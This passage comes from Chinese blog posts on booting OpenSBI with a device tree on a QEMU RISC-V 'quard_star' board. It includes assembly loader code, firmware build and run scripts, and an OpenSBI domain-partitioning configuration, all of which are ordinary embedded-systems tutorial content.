class="line">				&#125;;</span><br><span class="line"></span><br><span class="line">				core4 &#123;</span><br><span class="line">					cpu = &lt;0x7&gt;;</span><br><span class="line">				&#125;;</span><br><span class="line"></span><br><span class="line">				core5 &#123;</span><br><span class="line">					cpu = &lt;0x5&gt;;</span><br><span class="line">				&#125;;</span><br><span class="line"></span><br><span class="line">				core6 &#123;</span><br><span class="line">					cpu = &lt;0x3&gt;;</span><br><span class="line">				&#125;;</span><br><span class="line"></span><br><span class="line">				core7 &#123;</span><br><span class="line">					cpu = &lt;0x1&gt;;</span><br><span class="line">				&#125;;</span><br><span class="line">			&#125;;</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	soc &#123;</span><br><span class="line">		#address-cells = &lt;0x2&gt;;</span><br><span class="line">		#size-cells = &lt;0x2&gt;;</span><br><span class="line">		compatible = &quot;simple-bus&quot;;</span><br><span class="line">		ranges;</span><br><span class="line"></span><br><span class="line">		uart0: uart0@10000000 &#123;</span><br><span class="line">			interrupts = &lt;0xa&gt;;</span><br><span class="line">			interrupt-parent = &lt;0x11&gt;;</span><br><span class="line">			clock-frequency = &lt;0x384000&gt;;</span><br><span class="line">			reg = &lt;0x0 0x10000000 0x0 0x1000&gt;;</span><br><span class="line">			compatible = &quot;ns16550a&quot;;</span><br><span class="line">		&#125;;</span><br><span class="line"></span><br><span class="line">		uart1: uart1@10001000 &#123;</span><br><span class="line">			interrupts = &lt;0xa&gt;;</span><br><span class="line">			interrupt-parent = &lt;0x11&gt;;</span><br><span class="line">			clock-frequency = &lt;0x384000&gt;;</span><br><span class="line">			reg = &lt;0x0 0x10001000 0x0 0x1000&gt;;</span><br><span class="line">			compatible = &quot;ns16550a&quot;;</span><br><span class="line">		&#125;;</span><br><span class="line"></span><br><span class="line">        uart2: uart2@10002000 &#123;</span><br><span class="line">			interrupts = &lt;0xa&gt;;</span><br><span class="line">			interrupt-parent = &lt;0x11&gt;;</span><br><span class="line">			clock-frequency = &lt;0x384000&gt;;</span><br><span class="line">			reg = &lt;0x0 0x10002000 0x0 0x1000&gt;;</span><br><span class="line">			compatible = &quot;ns16550a&quot;;</span><br><span class="line">		&#125;;</span><br><span class="line"></span><br><span class="line">		plic@c000000 &#123;</span><br><span class="line">			phandle = &lt;0x11&gt;;</span><br><span class="line">			riscv,ndev = &lt;0x35&gt;;</span><br><span class="line">			reg = &lt;0x0 0xc000000 0x0 0x210000&gt;;</span><br><span class="line">			interrupts-extended = &lt;0x10 0xb 0x10 0x9 0xe 0xb 0xe 0x9 0xc 0xb 0xc 0x9 0xa 0xb 0xa 0x9 0x8 0xb 0x8 0x9 0x6 0xb 0x6 0x9 0x4 0xb 0x4 0x9 0x2 0xb 0x2 0x9&gt;;</span><br><span class="line">			interrupt-controller;</span><br><span class="line">			compatible = &quot;riscv,plic0&quot;;</span><br><span class="line">			#interrupt-cells = &lt;0x1&gt;;</span><br><span class="line">			#address-cells = &lt;0x0&gt;;</span><br><span class="line">		&#125;;</span><br><span class="line"></span><br><span class="line">		clint@2000000 &#123;</span><br><span class="line">			interrupts-extended = &lt;0x10 0x3 0x10 0x7 0xe 0x3 0xe 0x7 0xc 0x3 0xc 0x7 0xa 0x3 0xa 0x7 0x8 0x3 0x8 0x7 0x6 0x3 0x6 0x7 0x4 0x3 0x4 0x7 0x2 0x3 0x2 0x7&gt;;</span><br><span class="line">			reg = &lt;0x0 0x2000000 0x0 0x10000&gt;;</span><br><span class="line">			compatible = &quot;riscv,clint0&quot;;</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h1 id="3-start-s重新编写"><a href="#3-start-s重新编写" class="headerlink" title="3.start.s重新编写"></a>3.start.s重新编写</h1><p>start.s需要重新编写用于引导加载opensbi固件以及设备树，然后跳转到DRAM执行opensbi</p>
<blockquote>
<p>boot&#x2F;start.s</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	.macro loop,cunt</span><br><span class="line">    li		t1,	0xffff</span><br><span class="line">    li		t2,	\cunt</span><br><span class="line">1:</span><br><span class="line">	nop</span><br><span class="line">	addi    t1, t1, -1</span><br><span class="line">	bne		t1, x0, 1b</span><br><span class="line">    li		t1,	0xffff</span><br><span class="line">	addi    t2, t2, -1</span><br><span class="line">	bne		t2, x0, 1b</span><br><span class="line">	.endm</span><br><span class="line"></span><br><span class="line">	.macro load_data,_src_start,_dst_start,_dst_end</span><br><span class="line">	bgeu	\_dst_start, \_dst_end, 2f</span><br><span class="line">1:</span><br><span class="line">	lw      t0, (\_src_start)</span><br><span class="line">	sw      t0, (\_dst_start)</span><br><span class="line">	addi    \_src_start, \_src_start, 4</span><br><span class="line">	addi    \_dst_start, \_dst_start, 4</span><br><span class="line">	bltu    \_dst_start, \_dst_end, 1b</span><br><span class="line">2:</span><br><span class="line">	.endm</span><br><span class="line"></span><br><span class="line">	.section .text</span><br><span class="line">	.globl _start</span><br><span class="line">	.type _start,@function</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">	//load opensbi_fw.bin </span><br><span class="line">	//[0x20200000:0x20400000] --&gt; [0x80000000:0x80200000]</span><br><span class="line">    li		a0,	0x202</span><br><span class="line">	slli	a0,	a0, 20      //a0 = 0x20200000</span><br><span class="line">    li		a1,	0x800</span><br><span class="line">	slli	a1,	a1, 20      //a1 = 0x80000000</span><br><span class="line">    li		a2,	0x802</span><br><span class="line">	slli	a2,	a2, 20      //a2 = 0x80200000</span><br><span class="line">	load_data a0,a1,a2</span><br><span class="line"></span><br><span class="line">	//load qemu_sbi.dtb</span><br><span class="line">	//[0x20080000:0x20100000] --&gt; [0x82200000:0x82280000]</span><br><span class="line">    li		a0,	0x2008</span><br><span class="line">	slli	a0,	a0, 16       //a0 = 0x20080000</span><br><span class="line">    li		a1,	0x822</span><br><span class="line">	slli	a1,	a1, 20       //a1 = 0x82200000</span><br><span class="line">    li		a2,	0x8228</span><br><span class="line">	slli	a2,	a2, 16       //a2 = 0x82280000</span><br><span class="line">	load_data a0,a1,a2</span><br><span class="line"></span><br><span class="line">    csrr    a0, mhartid</span><br><span class="line">    li		t0,	0x0     </span><br><span class="line">	beq		a0, t0, _no_wait</span><br><span class="line">	loop	0x1000</span><br><span class="line">_no_wait:</span><br><span class="line">    li		a1,	0x822</span><br><span class="line">	slli	a1,	a1, 20       //a1 = 0x82200000</span><br><span class="line">    li	    t0,	0x800</span><br><span class="line">	slli	t0,	t0, 20       //t0 = 0x80000000</span><br><span class="line">    jr      t0</span><br><span class="line"></span><br><span class="line">    .end</span><br></pre></td></tr></table></figure>



<p><strong>解析：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	.macro loop,cunt</span><br><span class="line">    li		t1,	0xffff  # 将0xffff 加载到寄存器他</span><br><span class="line">    li		t2,	\cunt   # 将参数 cunt 的值加载到寄存器 t2 </span><br><span class="line">1:</span><br><span class="line">	nop					# 空操作</span><br><span class="line">	addi    t1, t1, -1  # t1 减 1</span><br><span class="line">	bne		t1, x0, 1b	# x0是riscv的零寄存器，值始终为0。如果 t1 不等于零，跳回标签 1，继续循环。 ben（非等）</span><br><span class="line">    li		t1,	0xffff	# 重置</span><br><span class="line">	addi    t2, t2, -1 	# t2 寄存器 减一</span><br><span class="line">	bne		t2, x0, 1b</span><br><span class="line">	.endm</span><br></pre></td></tr></table></figure>

<ul>
<li><code>loop</code>宏，这里定义了一个双重循环，用于执行一个固定次数的空操作。宏接收一个参数 <code>cunt</code> 表示外层循环数 t1是内存循环数</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.macro load_data,_src_start,_dst_start,_dst_end</span><br><span class="line">	bgeu	\_dst_start, \_dst_end, 2f  		# 如果 _dst_start &gt;= _dst_end，跳到标签 2</span><br><span class="line">1:</span><br><span class="line">	lw      t0, (\_src_start)					# 从 _src_start 加载一个字到 t0 lw load word</span><br><span class="line">	sw      t0, (\_dst_start)					# 将 t0 存储到 _dst_start</span><br><span class="line">	addi    \_src_start, \_src_start, 4			# 将 _src_start 增加 4</span><br><span class="line">	addi    \_dst_start, \_dst_start, 4			# 将 _dst_start 增加 4</span><br><span class="line">	bltu    \_dst_start, \_dst_end, 1b			# 如果 _dst_start &lt; _dst_end，跳回标签 1</span><br><span class="line">2:</span><br><span class="line">	.endm</span><br></pre></td></tr></table></figure>

<p><code>load_data</code>宏，定义了一个从源地址加载数据到目标地址的循环，直到目标地址到达结束地址。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.section .text</span><br><span class="line">.globl _start</span><br><span class="line">.type _start, @function</span><br></pre></td></tr></table></figure>

<ul>
<li><code>.section .text</code>：定义代码段（.text 段），用于存放可执行代码。</li>
<li><code>.globl _start</code>：声明 <code>_start</code> 标签为全局符号，使其在链接时可见。</li>
<li><code>.type _start, @function</code>：指定 <code>_start</code> 为函数类型</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//load opensbi_fw.bin </span><br><span class="line">//[0x20200000:0x20400000] --&gt; [0x80000000:0x80200000]</span><br><span class="line">   li		a0,	0x202</span><br><span class="line">slli	a0,	a0, 20      //a0 = 0x20200000 左移20位</span><br><span class="line">   li		a1,	0x800</span><br><span class="line">slli	a1,	a1, 20      //a1 = 0x80000000</span><br><span class="line">   li		a2,	0x802</span><br><span class="line">slli	a2,	a2, 20      //a2 = 0x80200000</span><br><span class="line">load_data a0,a1,a2</span><br></pre></td></tr></table></figure>

<ul>
<li>加载opensbi固件</li>
<li><strong>load_data a0, a1, a2</strong>: 调用宏 <code>load_data</code>，将从 <code>0x20200000</code> 到 <code>0x20400000</code> 的数据复制到 <code>0x80000000</code> 到 <code>0x80200000</code>。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//load qemu_sbi.dtb</span><br><span class="line">//[0x20080000:0x20100000] --&gt; [0x82200000:0x82280000]</span><br><span class="line">   li		a0,	0x2008</span><br><span class="line">slli	a0,	a0, 16       //a0 = 0x20080000</span><br><span class="line">   li		a1,	0x822</span><br><span class="line">slli	a1,	a1, 20       //a1 = 0x82200000</span><br><span class="line">   li		a2,	0x8228</span><br><span class="line">slli	a2,	a2, 16       //a2 = 0x82280000 左移16位</span><br><span class="line">load_data a0,a1,a2</span><br></pre></td></tr></table></figure>

<ul>
<li>加载qemu sbi 设备树</li>
<li><strong>load_data a0, a1, a2</strong>: 调用宏 <code>load_data</code>，将从 <code>0x20080000</code> 到 <code>0x20100000</code> 的数据复制到 <code>0x82200000</code> 到 <code>0x82280000</code>。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	csrr    a0, mhartid</span><br><span class="line">    li		t0,	0x0     </span><br><span class="line">	beq		a0, t0, _no_wait</span><br><span class="line">	loop	0x1000</span><br><span class="line">_no_wait:</span><br><span class="line">    li		a1,	0x822</span><br><span class="line">	slli	a1,	a1, 20       //a1 = 0x82200000</span><br><span class="line">    li	    t0,	0x800</span><br><span class="line">	slli	t0,	t0, 20       //t0 = 0x80000000</span><br><span class="line">    jr      t0</span><br></pre></td></tr></table></figure>

<ul>
<li><p>检查当前hart，</p>
</li>
<li><p><strong>csrr a0, mhartid</strong>: 读取当前 hart ID（硬件线程 ID）到寄存器 <code>a0</code>。</p>
<p><strong>li t0, 0x0</strong>: 将 <code>0</code> 加载到寄存器 <code>t0</code>。</p>
<p><strong>beq a0, t0, _no_wait</strong>: 如果 <code>a0</code> 等于 <code>t0</code>（即当前 hart ID 为 0），跳转到 <code>_no_wait</code> 标签。</p>
<p><strong>loop 0x1000</strong>: 否则，执行一个循环（定义在上面的 <code>loop</code> 宏中），大约等待一段时间。</p>
</li>
<li><p>nowait</p>
</li>
<li><p><strong>li a1, 0x822</strong>: 将 <code>0x822</code> 加载到寄存器 <code>a1</code> 中。</p>
<p><strong>slli a1, a1, 20</strong>: 将 <code>a1</code> 左移 20 位，使其值变为 <code>0x82200000</code>。 —设备树</p>
<p><strong>li t0, 0x800</strong>: 将 <code>0x800</code> 加载到寄存器 <code>t0</code> 中。</p>
<p><strong>slli t0, t0, 20</strong>: 将 <code>t0</code> 左移 20 位，使其值变为 <code>0x80000000</code>。 —opensbi</p>
<p><strong>jr t0</strong>: 跳转到 <code>t0</code>（即 <code>0x80000000</code>）处，开始执行新程序。 —opensbi</p>
</li>
</ul>
<p><strong>总结，这段代码实现了以下功能：</strong></p>
<ol>
<li>将 OpenSBI 固件从 <code>0x20200000</code> 复制到 <code>0x80000000</code>。</li>
<li>将 QEMU SBI 设备树从 <code>0x20080000</code> 复制到 <code>0x82200000</code>。</li>
<li>检查当前 hart ID，如果不是 0，则执行一个等待循环。</li>
<li>跳转到 <code>0x80000000</code> 处，执行新的程序。</li>
</ol>
<h1 id="4-build-sh和-run-sh修改"><a href="#4-build-sh和-run-sh修改" class="headerlink" title="4.build.sh和 run.sh修改"></a>4.build.sh和 run.sh修改</h1><blockquote>
<p>build.sh</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">---------------------------编译opensbi-----------------------------</span></span><br><span class="line">echo &quot;------------------------- 编译opensbi-----------------------------&quot;</span><br><span class="line">if [ ! -d &quot;$SHELL_FOLDER/output/opensbi&quot; ]; then  </span><br><span class="line">mkdir $SHELL_FOLDER/output/opensbi</span><br><span class="line">fi  </span><br><span class="line">cd $SHELL_FOLDER/opensbi-1.2</span><br><span class="line">make CROSS_COMPILE=$CROSS_PREFIX- PLATFORM=quard_star</span><br><span class="line">cp -r $SHELL_FOLDER/opensbi-1.2/build/platform/quard_star/firmware/*.bin $SHELL_FOLDER/output/opensbi/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成sbi.dtb</span></span><br><span class="line">cd $SHELL_FOLDER/dts</span><br><span class="line">dtc -I dts -O dtb -o $SHELL_FOLDER/output/opensbi/quard_star_sbi.dtb quard_star_sbi.dts</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">合成firmware固件</span></span><br><span class="line">if [ ! -d &quot;$SHELL_FOLDER/output/fw&quot; ]; then  </span><br><span class="line">mkdir $SHELL_FOLDER/output/fw</span><br><span class="line">fi  </span><br><span class="line">cd $SHELL_FOLDER/output/fw</span><br><span class="line">rm -rf fw.bin</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">填充 32K的0</span></span><br><span class="line">dd of=fw.bin bs=1k count=32k if=/dev/zero   </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="comment"># 写入 lowlevel_fw.bin 偏移量地址为 0</span></span></span><br><span class="line">dd of=fw.bin bs=1k conv=notrunc seek=0 if=$SHELL_FOLDER/output/lowlevelboot/lowlevel_fw.bin</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">写入 quard_star_sbi.dtb 地址偏移量为 512K，因此 fdt的地址偏移量为 0x80000</span></span><br><span class="line">dd of=fw.bin bs=1k conv=notrunc seek=512 if=$SHELL_FOLDER/output/opensbi/quard_star_sbi.dtb</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">写入 fw_jump.bin 地址偏移量为 2K*1K= 0x2000000，因此 fw_jump.bin的地址偏移量为  0x2000000</span></span><br><span class="line">dd of=fw.bin bs=1k conv=notrunc seek=2k if=$SHELL_FOLDER/output/opensbi/fw_jump.bin</span><br></pre></td></tr></table></figure>

<p><strong>操作：</strong></p>
<ol>
<li>首先编译了opensbi，并且指定了板</li>
<li>编译生成设备树dtb</li>
<li>合成固件</li>
</ol>
<ul>
<li>根据dd命令的使用可以看见将<code>quard_star_sbi.dtb</code>写入到了偏移地址为<code>0x80000</code>的地方，用于这个固件会被加载到<code>flash</code>处，所以设备树的地址为：<code>0x20080000 </code> —- <strong>对应了<code>start.s</code>文件加载设备树的地址</strong></li>
<li><code>fw_jump.bin</code> 地址偏移量为 <code>2K*1K= 0x2000000</code>，因此 <code>fw_jump.bin</code>的地址偏移量为 <code>0x2000000</code>，同理 这个固件会被加载到<code>flash</code>，所以<code>opensbi</code>固件的地址为：<code>0x20200000</code>   <strong>—对应<code>start.s</code> 加载 <code>opensbi</code>的位置</strong></li>
<li><code>lowlevel_fw.bin</code> 偏移量地址为 0，因此<code>lowlevel_fw.bin</code> 的地址为：<code>0x20000000</code></li>
<li><code>dd of=fw.bin bs=1k count=32k if=/dev/zero </code>来填充填充 32K的0，这是<code>qemu</code>使用<code>-drive</code>加载的固件的大小要大于等于定义的<code>flash</code>的大小，不然会报错。</li>
</ul>
<p><strong>注意</strong></p>
<p>现在固件包含三个内容：</p>
<ol>
<li>首先是起始<code>0x20000000</code>的<code>lowlevel_fw.bin</code><ol>
<li>lowlevel的作用是将opensbi 以及设备树文件从flash中 加载到 DRAM（0x80000000），然后跳转到DRAM执行</li>
</ol>
</li>
<li>然后是<code>0x20080000</code>地址处的<code>dtb</code>文件</li>
<li>接下来是<code>0x20200000</code>处的<code>opensbi</code>程序</li>
</ol>
<blockquote>
<p>run.sh</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SHELL_FOLDER=$(cd &quot;$(dirname &quot;$0&quot;)&quot;;pwd)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">SHELL_FOLDER/output/qemu/bin/qemu-system-riscv64 \</span></span><br><span class="line"><span class="language-bash">-M quard-star \</span></span><br><span class="line"><span class="language-bash">-m 1G \</span></span><br><span class="line"><span class="language-bash">-smp 8 \</span></span><br><span class="line"><span class="language-bash">-bios none \</span></span><br><span class="line"><span class="language-bash">-drive <span class="keyword">if</span>=pflash,bus=0,unit=0,format=raw,file=<span class="variable">$SHELL_FOLDER</span>/output/fw/fw.bin \</span></span><br><span class="line"><span class="language-bash">-d in_asm -D qemu.log \</span></span><br><span class="line"><span class="language-bash">-nographic --parallel none \</span></span><br></pre></td></tr></table></figure>

<p>这里添加了一个<code>qemu.log</code>会生成汇编代码，可以根据这个log来查看固件是否有正确的加载、跳转。</p>
<p>执行<code>build.sh run.sh</code></p>
<p>报错<code>./build.sh: 45: dtc: not found</code></p>
<p>执行：<code>sudo apt-get install device-tree-complier</code></p>
<blockquote>
<p>还需要修改</p>
<p>quard_star.c   把DRAM内存扩大</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[QUARD_STAR_DRAM]  = &#123; <span class="number">0x80000000</span>,    <span class="number">0x40000000</span> &#125;,</span><br></pre></td></tr></table></figure>



<p><strong>显示结果</strong></p>
<p><img src="/2024/06/08/riscv-5-%E8%AE%BE%E5%A4%87%E6%A0%91/image-20240609181609447.png" alt="image-20240609181609447"></p>
<h1 id="5-内存布局"><a href="#5-内存布局" class="headerlink" title="5.内存布局"></a>5.内存布局</h1><ol>
<li><code>rom</code>中先从（<code>fw_dynamic_info</code>这个结构体指示了<code>flash</code>的起始地址 在哪找到它）<code>flash</code>记载<code>lowlevel</code>，然后跳转执行<code>flash</code>   (<code>flash</code>中的固件是直接 <code>drive</code>注入的)</li>
<li><code>flash</code>中存放l<code>owerlevel.bin</code>，<code>opensbi</code>固件，设备树固件</li>
<li>将<code>opensbi</code>，设备树固件加载到<code>DRAM</code> 并跳转执行</li>
</ol>
<p><img src="/2024/06/08/riscv-5-%E8%AE%BE%E5%A4%87%E6%A0%91/image-20240609182439432.png" alt="image-20240609182439432"></p>
]]></content>
      <categories>
        <category>riscv</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
        <tag>riscv，qemu</tag>
      </tags>
  </entry>
  <entry>
    <title>riscv-6-domain</title>
    <url>/2024/06/09/riscv-6-domain%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<h1 id="1-domain机制介绍"><a href="#1-domain机制介绍" class="headerlink" title="1.domain机制介绍"></a>1.domain机制介绍</h1><p><strong>domain机制：</strong>人为的将SOC内部硬件划分为<strong>不同的权限区域</strong>，然后分别独立运行，其使用了riscv的权限管理的硬件保护单元。它提供了一种在系统中划分资源和权限的方法，以确保软件实体之间的相互隔离和安全性。</p>
<p>OpenSBI运行在系统的M模式，而<strong>不同Domain的上层程序只能工作在S模式或者U模式</strong>，即便是Linux Kernel也必须接收OpenSBI的Domain权限限制，domain划分带来一个好处，比如你希望SOC中的一部分core在smp模式下运行linux内核，而另一部分core工作在amp模式下，<strong>单独运行裸机程序或者RTOS会非常容易操作，将其划分到不同Domian即可</strong>，除此之外，Domian还可以划分内存地址，mmio地址，可以进行较为细致的权限划分。</p>
<p>Opensbi的domain机制通过以下的方式实现：</p>
<ol>
<li>Domain ID：每个 domain 都有一个唯一的标识符，称为 Domain ID。它用于区分不同的 domain。</li>
<li>Hart Mask：OpenSBI 使用 Hart Mask 来表示哪些处理器属于特定的 domain。<strong>Hart Mask 是一个位图，每个位代表一个处理器，可以将相应的位设置为 1 表示该处理器属于某个 domain。</strong></li>
<li>SBI 接口：OpenSBI 提供了一组 SBI（Supervisor Binary Interface）接口，用于 domain 之间的通信和资源管理。<strong>这些接口包括中断处理、内存管理、设备访问等，可以由 domain 使用来请求和管理资源。</strong></li>
</ol>
<p>在目录<code>opensbi/doc</code>下<code>domian_support.md</code>文档介绍了如何使用设备树来基于opensbi来划分domain。</p>
<p>具体解释见：<a href="https://yanglianoo.github.io/2023/06/24/%E5%9F%BA%E4%BA%8Eopensbi%E4%B8%BAquard-star%E5%88%9B%E5%BB%BAdomain/">基于opensbi为quard_star创建domain | TimerのBlog (yanglianoo.github.io)</a></p>
<h1 id="2-quard-star的domain实现"><a href="#2-quard-star的domain实现" class="headerlink" title="2.quard_star的domain实现"></a>2.quard_star的domain实现</h1><blockquote>
<p>dts&#x2F;quard_star_sbi.dts 添加</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">opensbi-domains &#123;  /* 定义opensbi-domains描述节点 */</span><br><span class="line">    compatible = &quot;opensbi,domain,config&quot;; /* 节点名称 */</span><br><span class="line"></span><br><span class="line">          tmem: tmem &#123;   /* 定义内存节点 */</span><br><span class="line">              compatible = &quot;opensbi,domain,memregion&quot;;  /* 节点名称 */</span><br><span class="line">              base = &lt;0x0 0xb0000000&gt;; /* 起始地址注意64位地址哦 */</span><br><span class="line">              order = &lt;28&gt;; /* 内存大小即size=2^28 */</span><br><span class="line">          &#125;;</span><br><span class="line"></span><br><span class="line">          tuart: tuart &#123;  /* 定义mmio节点 */</span><br><span class="line">              compatible = &quot;opensbi,domain,memregion&quot;;  /* 节点名称 */</span><br><span class="line">              base = &lt;0x0 0x10002000&gt;; /* 起始地址 */</span><br><span class="line">              order = &lt;8&gt;; /* size=2^8 */</span><br><span class="line">              mmio;  /* mmio属性 */</span><br><span class="line">              devices = &lt;&amp;uart2&gt;; /* 关联到设备节点上 */</span><br><span class="line">          &#125;;</span><br><span class="line"></span><br><span class="line">    allmem: allmem &#123; /* 定义内存节点，这个节点保护所有地址 */</span><br><span class="line">        compatible = &quot;opensbi,domain,memregion&quot;;</span><br><span class="line">        base = &lt;0x0 0x0&gt;;</span><br><span class="line">        order = &lt;64&gt;;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">          tdomain: trusted-domain &#123; /* 定义domian节点 */</span><br><span class="line">              compatible = &quot;opensbi,domain,instance&quot;;  /* 节点名称 */</span><br><span class="line">              possible-harts = &lt;&amp;cpu7&gt;; /* domian中允许使用的cpu core */</span><br><span class="line">              regions = &lt;&amp;tmem 0x7&gt;, &lt;&amp;tuart 0x7&gt;, &lt;&amp;allmem 0x7&gt;;/* 各个内存/mmio区域的权限，3bit读写运行权限 0x7拥有全部权限 */</span><br><span class="line">              boot-hart = &lt;&amp;cpu7&gt;; /* domian中用于boot的core */</span><br><span class="line">              next-arg1 = &lt;0x0 0x00000000&gt;; /* 下级程序的参数 */</span><br><span class="line">        next-addr = &lt;0x0 0xb0000000&gt;; /* 下级程序的起始地址 */</span><br><span class="line">        next-mode = &lt;0x0&gt;; /* 下级程序的允许模式 0为U模式，1为S模式 */</span><br><span class="line">              system-reset-allowed; /* 允许复位 */</span><br><span class="line">          &#125;;</span><br><span class="line"></span><br><span class="line">    udomain: untrusted-domain &#123;</span><br><span class="line">        compatible = &quot;opensbi,domain,instance&quot;;</span><br><span class="line">        possible-harts = &lt;&amp;cpu0 &amp;cpu1 &amp;cpu2 &amp;cpu3 &amp;cpu4 &amp;cpu5 &amp;cpu6&gt;;</span><br><span class="line">        regions = &lt;&amp;tmem 0x0&gt;, &lt;&amp;tuart 0x0&gt;, &lt;&amp;allmem 0x7&gt;;</span><br><span class="line">		boot-hart = &lt;&amp;cpu0&gt;;</span><br><span class="line">        next-arg1 = &lt;0x0 0x82200000&gt;;</span><br><span class="line">        next-addr = &lt;0x0 0x82000000&gt;;</span><br><span class="line">        next-mode = &lt;0x1&gt;;</span><br><span class="line">        system-reset-allowed;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p><strong>分开来解释：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tdomain: trusted-domain &#123; 								/* 定义domian节点 */</span><br><span class="line">             compatible = &quot;opensbi,domain,instance&quot;;  			/* 节点名称 */</span><br><span class="line">             possible-harts = &lt;&amp;cpu7&gt;; 							/* domian中允许使用的cpu core */</span><br><span class="line">             regions = &lt;&amp;tmem 0x7&gt;, &lt;&amp;tuart 0x7&gt;, &lt;&amp;allmem 0x7&gt;;	/* 各个内存/mmio区域的权限，3bit读写运行权限 0x7拥有全部权限 */</span><br><span class="line">             boot-hart = &lt;&amp;cpu7&gt;; 								/* domian中用于boot的core */</span><br><span class="line">             next-arg1 = &lt;0x0 0x00000000&gt;; 						/* 下级程序的参数 */</span><br><span class="line">       next-addr = &lt;0x0 0xb0000000&gt;;				 		/* 下级程序的起始地址 */</span><br><span class="line">       next-mode = &lt;0x0&gt;; 									/* 下级程序的允许模式 0为U模式，1为S模式 */</span><br><span class="line">             system-reset-allowed; 								/* 允许复位 */</span><br><span class="line">         &#125;;</span><br></pre></td></tr></table></figure>

<p>定义<code>tdomian</code> — <code>trust domain</code> 这个使用了cpu7，下级程序的起始地址<code>0xb0000000</code>，模式为U模式，可以运行<code>freertos</code>的实时操作系统等</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">udomain: untrusted-domain &#123;</span><br><span class="line">       compatible = &quot;opensbi,domain,instance&quot;;</span><br><span class="line">       possible-harts = &lt;&amp;cpu0 &amp;cpu1 &amp;cpu2 &amp;cpu3 &amp;cpu4 &amp;cpu5 &amp;cpu6&gt;;</span><br><span class="line">       regions = &lt;&amp;tmem 0x0&gt;, &lt;&amp;tuart 0x0&gt;, &lt;&amp;allmem 0x7&gt;;   	# 0x0 表示无权限</span><br><span class="line">	boot-hart = &lt;&amp;cpu0&gt;;</span><br><span class="line">       next-arg1 = &lt;0x0 0x82200000&gt;;</span><br><span class="line">       next-addr = &lt;0x0 0x82000000&gt;;</span><br><span class="line">       next-mode = &lt;0x1&gt;;										/* 下级程序的允许模式 0为U模式，1为S模式 */</span><br><span class="line">       system-reset-allowed;</span><br><span class="line">   &#125;;</span><br></pre></td></tr></table></figure>

<p>定义<code>udomain</code>，不受信任的域，用于运行Linux系统等</p>
<p>这种模式的划分：</p>
<ul>
<li><code>openSBI</code>运行在系统的<code>M</code>模式，而不同<code>Domain</code>的上层程序只能工作在<code>S</code>模式或者<code>U</code>模式，即便是<code>Linux Kernel</code>也必须接收<code>OpenSBI</code>的<code>Domain</code>权限限制，<code>domain</code>划分带来一个好处，比如你希望<code>SOC</code>中的一部分<code>core</code>在<code>smp</code>模式下运行<code>linux</code>内核，而另一部分<code>core</code>工作在<code>amp</code>模式下，单独运行裸机程序或者<code>RTOS</code>会非常容易操作，将其划分到不同<code>Domian</code>即可。</li>
<li><img src="/2024/06/09/riscv-6-domain%E6%9C%BA%E5%88%B6/image-20240610153823283.png" alt="image-20240610153823283"></li>
</ul>
<h1 id="3-domain测试代码"><a href="#3-domain测试代码" class="headerlink" title="3.domain测试代码"></a>3.domain测试代码</h1><p>新建<code>trust_domain</code>文件夹，以及在文件夹内新建两个文件<code>link.lds</code> 和 <code>startup.s</code></p>
<blockquote>
<p>trust_domain&#x2F;link.lds</p>
<p>注意这起始的地址是0xb0000000，与上面 tdomian保持一直，因为信任域设置就从这个地址开始了</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OUTPUT_ARCH( &quot;riscv&quot; )</span><br><span class="line"></span><br><span class="line">ENTRY( _start )</span><br><span class="line"></span><br><span class="line">MEMORY</span><br><span class="line">&#123; </span><br><span class="line">	ddr (rxai!w) : ORIGIN = 0xb0000000, LENGTH = 256M</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SECTIONS</span><br><span class="line">&#123;</span><br><span class="line">  .text :</span><br><span class="line">  &#123;</span><br><span class="line">    KEEP(*(.text))</span><br><span class="line">  &#125; &gt;ddr</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>trust_domain&#x2F;startup.s</p>
<p>这里串口输出的是<code>uart2</code>，也就是上面定义的<code>tuart</code>，输出地址为<code>0x10002000</code> </p>
</blockquote>
